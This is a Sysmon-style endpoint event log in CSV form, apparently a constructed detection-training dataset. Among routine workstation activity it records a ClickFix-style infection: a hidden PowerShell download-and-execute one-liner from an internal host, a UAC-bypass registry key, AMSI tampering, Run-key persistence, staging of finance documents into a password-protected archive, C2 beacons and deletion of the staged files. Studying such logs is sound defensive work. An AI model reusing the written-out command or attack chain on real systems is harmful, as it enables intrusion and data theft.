RecordNumber,EventId,TimeCreated,Computer,User,ProcessGuid,Image,ParentImage,CommandLine,ParentCommandLine,IntegrityLevel,Hashes,TargetImage,TargetObject,Details,GrantedAccess,CallTrace,DestinationHostname,DestinationIp,DestinationPort
101344,7,2026-04-12T09:00:44.011Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a0f1...0001},C:\Windows\System32\svchost.exe,,,,,,,C:\Windows\System32\wintrust.dll,,,,,,,
101345,7,2026-04-12T09:00:44.201Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a0f1...0001},C:\Windows\System32\svchost.exe,,,,,,,C:\Windows\System32\crypt32.dll,,,,,,,
101346,7,2026-04-12T09:00:44.410Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a0f1...0001},C:\Windows\System32\svchost.exe,,,,,,,C:\Windows\System32\bcrypt.dll,,,,,,,
101349,1,2026-04-12T09:00:58.500Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a201...0011},C:\Windows\System32\SearchIndexer.exe,C:\Windows\System32\services.exe,"C:\Windows\System32\SearchIndexer.exe /Embedding","C:\Windows\System32\services.exe",System,"SHA256=bb01...",,,,,,,,
101351,1,2026-04-12T09:02:33.881Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a301...0012},C:\Windows\System32\gpupdate.exe,C:\Windows\System32\svchost.exe,"gpupdate /force","C:\Windows\System32\svchost.exe -k netsvcs",System,"SHA256=cc11...",,,,,,,,
101352,3,2026-04-12T09:02:34.055Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a301...0012},C:\Windows\System32\gpupdate.exe,,,,,,,,,,,dc01.northwind.local,10.10.10.11,445
101353,1,2026-04-12T09:03:07.402Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a401...0013},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\svchost.exe,"powershell.exe -NoProfile -Command Get-WinEvent -MaxEvents 20","C:\Windows\System32\svchost.exe -k netsvcs",System,"SHA256=88b1a76b1cf6e18d9a1a0e2c1b8f7d6e2c1a9b8f7e6d5c4b3a29180716253647",,,,,,,,
101354,1,2026-04-12T09:04:11.500Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a501...0014},C:\Windows\System32\msiexec.exe,C:\Windows\System32\svchost.exe,"""msiexec.exe"" /V","C:\Windows\System32\svchost.exe -k netsvcs",System,"SHA256=1120...",,,,,,,,
101355,11,2026-04-12T09:04:12.021Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a501...0014},C:\Windows\System32\msiexec.exe,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Temp\MSI3f2a0.LOG,,,,,
101356,1,2026-04-12T09:05:13.401Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a601...0015},C:\Windows\CCM\CcmExec.exe,C:\Windows\System32\services.exe,"""C:\Windows\CCM\CcmExec.exe""","C:\Windows\System32\services.exe",System,"SHA256=dd42...",,,,,,,,
101357,1,2026-04-12T09:05:31.221Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a701...0016},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\CCM\CcmExec.exe,"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""iwr -Uri https://sccm.northwind.lab/apps/Chrome/latest.json -UseBasicParsing | ConvertFrom-Json""","C:\Windows\CCM\CcmExec.exe",System,"SHA256=88b1a76b1cf6e18d9a1a0e2c1b8f7d6e2c1a9b8f7e6d5c4b3a29180716253647",,,,,,,,
101358,3,2026-04-12T09:15:07.221Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b122...0011},C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,,,,,,,,,,,outlook.office365.com,52.98.170.42,443
101359,3,2026-04-12T09:15:44.020Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b122...0011},C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,,,,,,,,,,,autodiscover-s.outlook.com,52.98.170.42,443
101360,11,2026-04-12T09:16:12.200Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b122...0011},C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\Outlook\katerina.morfopoulou@northwind.lab.ost,,,,,
101361,1,2026-04-12T09:17:00.011Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{b201...0018},C:\Windows\System32\taskhostw.exe,C:\Windows\System32\svchost.exe,"taskhostw.exe","C:\Windows\System32\svchost.exe -k netsvcs",System,"SHA256=ee12...",,,,,,,,
101362,3,2026-04-12T09:20:04.410Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a0f1...0001},C:\Windows\System32\svchost.exe,,,,,,,,,,,settings-win.data.microsoft.com,52.184.220.203,443
101363,3,2026-04-12T09:20:19.881Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{a0f1...0001},C:\Windows\System32\svchost.exe,,,,,,,,,,,ctldl.windowsupdate.com,152.199.19.161,443
101364,1,2026-04-12T09:20:44.211Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b191...0019},C:\Windows\System32\backgroundTaskHost.exe,C:\Windows\System32\svchost.exe,"""backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca","C:\Windows\System32\svchost.exe -k DcomLaunch",Medium,"SHA256=8801...",,,,,,,,
101369,3,2026-04-12T09:21:11.881Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,cdn.jsdelivr.net,151.101.1.229,443
101370,3,2026-04-12T09:21:12.111Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,fonts.googleapis.com,142.250.180.42,443
101371,3,2026-04-12T09:21:14.211Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,accounts.google.com,142.250.181.13,443
101372,11,2026-04-12T09:21:18.700Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Google\Chrome\User Data\Default\Cache\data_2,,,,,
101377,1,2026-04-12T09:22:03.121Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b301...0030},C:\Users\katerina.morfopoulou\AppData\Local\slack\slack.exe,C:\Users\katerina.morfopoulou\AppData\Local\slack\Update.exe,"""slack.exe"" --startup","""Update.exe"" --processStart slack.exe",Medium,"SHA256=cc9e...",,,,,,,,
101378,3,2026-04-12T09:22:13.412Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b301...0030},C:\Users\katerina.morfopoulou\AppData\Local\slack\slack.exe,,,,,,,,,,,slack.com,52.85.132.14,443
101380,3,2026-04-12T09:22:15.088Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b301...0030},C:\Users\katerina.morfopoulou\AppData\Local\slack\slack.exe,,,,,,,,,,,wss-primary.slack.com,52.85.132.111,443
101381,3,2026-04-12T09:23:00.410Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b301...0030},C:\Users\katerina.morfopoulou\AppData\Local\slack\slack.exe,,,,,,,,,,,files-edge.slack.com,52.85.132.90,443
101382,11,2026-04-12T09:23:04.881Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b301...0030},C:\Users\katerina.morfopoulou\AppData\Local\slack\slack.exe,,,,,,,,C:\Users\katerina.morfopoulou\AppData\Roaming\Slack\storage\slack-downloads,,,,,
101383,1,2026-04-12T09:24:11.481Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{c301...0031},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\CCM\CcmExec.exe,"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri https://sccm.northwind.lab/policy/machine -Method Get -UseDefaultCredentials | Out-Null""","C:\Windows\CCM\CcmExec.exe",System,"SHA256=88b1a76b1cf6e18d9a1a0e2c1b8f7d6e2c1a9b8f7e6d5c4b3a29180716253647",,,,,,,,
101384,3,2026-04-12T09:24:12.011Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{c301...0031},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,,,sccm.northwind.lab,10.10.10.44,443
101385,1,2026-04-12T09:25:00.221Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{c401...0032},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\Teams\current\Teams.exe,C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\Teams\Update.exe,"""Teams.exe"" --system-initiated","Update.exe --processStart Teams.exe",Medium,"SHA256=ff11...",,,,,,,,
101386,3,2026-04-12T09:25:04.101Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{c401...0032},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\Teams\current\Teams.exe,,,,,,,,,,,teams.microsoft.com,52.114.132.14,443
101387,3,2026-04-12T09:25:07.811Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{c401...0032},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\Teams\current\Teams.exe,,,,,,,,,,,statics.teams.cdn.office.net,13.107.136.9,443
101388,11,2026-04-12T09:25:12.410Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{c401...0032},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\Teams\current\Teams.exe,,,,,,,,C:\Users\katerina.morfopoulou\AppData\Roaming\Microsoft\Teams\Cache\f_00001a,,,,,
101389,3,2026-04-12T09:28:00.001Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,drive.google.com,142.250.185.174,443
101390,3,2026-04-12T09:28:02.211Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,docs.google.com,142.250.185.174,443
101391,11,2026-04-12T09:28:11.881Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Google\Chrome\User Data\Default\Sessions\Session_13351212004,,,,,
101392,1,2026-04-12T09:31:04.401Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{c501...0033},C:\Windows\System32\WerFault.exe,C:\Windows\System32\svchost.exe,"WerFault.exe /pid 2412 /appcrash","C:\Windows\System32\svchost.exe -k WerSvcGroup",System,"SHA256=eeaa...",,,,,,,,
101393,1,2026-04-12T09:33:00.021Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{c601...0034},C:\Program Files\Windows Defender\MpCmdRun.exe,C:\Program Files\Windows Defender\MsMpEng.exe,"""MpCmdRun.exe"" -ScheduledScan -QuickScan","MsMpEng.exe",System,"SHA256=99aa...",,,,,,,,
101394,1,2026-04-12T09:35:12.331Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{c001...0040},C:\Program Files\Google\Chrome\Application\chrome.exe,C:\Windows\explorer.exe,"""chrome.exe"" --new-tab https://intranet.northwind.lab/finance","""explorer.exe""",Medium,"SHA256=dd11...",,,,,,,,
101395,3,2026-04-12T09:35:14.881Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,intranet.northwind.lab,10.10.10.60,443
101396,3,2026-04-12T09:36:01.301Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,jira.northwind.lab,10.10.10.61,443
101397,3,2026-04-12T09:37:22.411Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,github.githubusercontent.com,185.199.108.133,443
101398,11,2026-04-12T09:39:20.100Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,C:\Users\katerina.morfopoulou\Downloads\clickfix.html.crdownload,,,,,
101399,3,2026-04-12T09:39:52.881Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,assets.corp-cdn.top,151.101.1.10,443
101400,3,2026-04-12T09:40:02.500Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,ssl.gstatic.com,142.250.180.35,443
101401,1,2026-04-12T09:40:47.204Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{3d1e...a002},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\explorer.exe,"powershell -w hidden -c ""iwr -useb http://10.10.42.200:8080/x.txt | iex""","C:\Windows\explorer.exe",Medium,"SHA256=88b1a76b1cf6e18d9a1a0e2c1b8f7d6e2c1a9b8f7e6d5c4b3a29180716253647",,,,,,,,
101402,3,2026-04-12T09:40:48.301Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{3d1e...a002},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,,,,,10.10.42.200,10.10.42.200,8080
101403,3,2026-04-12T09:40:48.712Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,fonts.gstatic.com,142.250.180.35,443
101404,3,2026-04-12T09:40:49.011Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,accounts.google.com,142.250.181.13,443
101405,7,2026-04-12T09:40:50.031Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{3d1e...a002},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll,,,,,,,
101406,7,2026-04-12T09:40:50.301Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{3d1e...a002},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,C:\Windows\System32\amsi.dll,,,,,,,
101407,7,2026-04-12T09:40:50.512Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{3d1e...a002},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,C:\Windows\System32\wininet.dll,,,,,,,
101408,11,2026-04-12T09:40:52.980Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{3d1e...a002},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,
101409,1,2026-04-12T09:40:53.011Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe""","powershell -w hidden -c ""iwr -useb http://10.10.42.200:8080/x.txt | iex""",Medium,"SHA256=7a5f92c1e0c8b3d4a6f1e2b0c9d8a7b6c5e4d3f2a1b09c8d7e6f5a4b3c2d1e0f9",,,,,,,,
101410,1,2026-04-12T09:41:00.010Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{c221...0041},C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,C:\Windows\explorer.exe,"""OUTLOOK.EXE"" /recycle","C:\Windows\explorer.exe",Medium,"SHA256=fa02...",,,,,,,,
101411,13,2026-04-12T09:41:02.744Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,,HKU\S-1-5-21-...-1104\Software\Classes\ms-settings\Shell\Open\command\(Default),"C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe --uac",,,,,
101412,10,2026-04-12T09:41:07.918Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},,,,,,,C:\Windows\System32\amsi.dll,,,0x143a,"C:\Windows\System32\ntdll.dll+9d244|C:\Windows\System32\amsi.dll+3a10|UNKNOWN(0x7ffd12ab0044)",,,,
101413,13,2026-04-12T09:41:14.020Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,,HKU\S-1-5-21-...-1104\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\a,"powershell -w hidden -c ""iwr -useb http://10.10.42.200:8080/x.txt | iex""\1",,,,,
101414,3,2026-04-12T09:41:14.700Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,,,,,steamcommunity.com,10.10.42.201,443
101415,3,2026-04-12T09:41:15.201Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,,,,,c2-updates.corp-cdn.top,10.10.42.201,443
101416,3,2026-04-12T09:41:16.011Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{c221...0041},C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,,,,,,,,,,,outlook.office365.com,52.98.170.42,443
101417,3,2026-04-12T09:41:17.100Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b301...0030},C:\Users\katerina.morfopoulou\AppData\Local\slack\slack.exe,,,,,,,,,,,wss-primary.slack.com,52.85.132.111,443
101418,13,2026-04-12T09:41:19.502Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,,HKU\S-1-5-21-...-1104\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync,"C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe",,,,,
101419,1,2026-04-12T09:41:20.312Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{d331...0042},C:\Windows\System32\backgroundTaskHost.exe,C:\Windows\System32\svchost.exe,"""backgroundTaskHost.exe"" -ServerName:BackgroundTaskHost.WebAccountProvider","C:\Windows\System32\svchost.exe -k DcomLaunch",System,"SHA256=8801...",,,,,,,,
101420,10,2026-04-12T09:41:24.331Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},,,,,,,C:\Program Files\Google\Chrome\Application\chrome.exe,,,0x1010,"C:\Windows\System32\ntdll.dll+9d244|C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe+41220",,,,
101421,11,2026-04-12T09:41:27.011Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\System.txt,,,,,
101422,11,2026-04-12T09:41:27.900Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Google\Chrome\User Data\Default\History-journal,,,,,
101423,11,2026-04-12T09:41:29.011Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\Northwind_Q4_earnings.docx,,,,,
101424,11,2026-04-12T09:41:29.450Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\expenses-summary.xlsx,,,,,
101425,11,2026-04-12T09:41:29.500Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\todo.txt,,,,,
101430,1,2026-04-12T09:41:31.870Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{5b71...c704},C:\Program Files\7-Zip\7z.exe,C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,"""C:\Program Files\7-Zip\7z.exe"" a -pStG!7ip-42-nw -mx=1 C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\stealer_bundle.zip C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\","""C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe""",Medium,"SHA256=b9c72a4d61...(7z.exe hash)",,,,,,,,
101431,1,2026-04-12T09:41:32.011Z,FIN-WKS-07,NT AUTHORITY\SYSTEM,{6c12...d805},C:\Windows\System32\msiexec.exe,C:\Windows\System32\svchost.exe,"""msiexec.exe"" /V","C:\Windows\System32\svchost.exe -k netsvcs",System,"SHA256=1120...",,,,,,,,
101432,3,2026-04-12T09:41:32.500Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,assets.corp-cdn.top,151.101.1.10,443
101433,3,2026-04-12T09:41:32.812Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{c401...0032},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\Teams\current\Teams.exe,,,,,,,,,,,teams.microsoft.com,52.114.132.14,443
101438,3,2026-04-12T09:41:33.100Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,,,,,c2-updates.corp-cdn.top,10.10.42.201,443
101439,3,2026-04-12T09:41:35.401Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,,,,,c2-updates.corp-cdn.top,10.10.42.201,443
101440,3,2026-04-12T09:41:38.221Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b301...0030},C:\Users\katerina.morfopoulou\AppData\Local\slack\slack.exe,,,,,,,,,,,cdn.slack-edge.com,151.101.1.140,443
101441,3,2026-04-12T09:41:40.100Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{b204...0020},C:\Program Files\Google\Chrome\Application\chrome.exe,,,,,,,,,,,clients2.google.com,142.250.185.238,443
101450,23,2026-04-12T09:41:41.508Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\stealer_bundle.zip,,,,,,,
101451,23,2026-04-12T09:41:41.550Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\System.txt,,,,,,,
101452,23,2026-04-12T09:41:41.600Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{4a2f...b103},C:\Users\katerina.morfopoulou\AppData\Local\Microsoft\OneDrive\Update\OneDriveSync.exe,,,,,,,,C:\Users\katerina.morfopoulou\AppData\Local\Temp\WwaCJ7z\Northwind_Q4_earnings.docx,,,,,,,
101455,3,2026-04-12T09:43:00.100Z,FIN-WKS-07,NORTHWIND\katerina.morfopoulou,{c221...0041},C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,,,,,,,,,,,outlook.office365.com,52.98.170.42,443
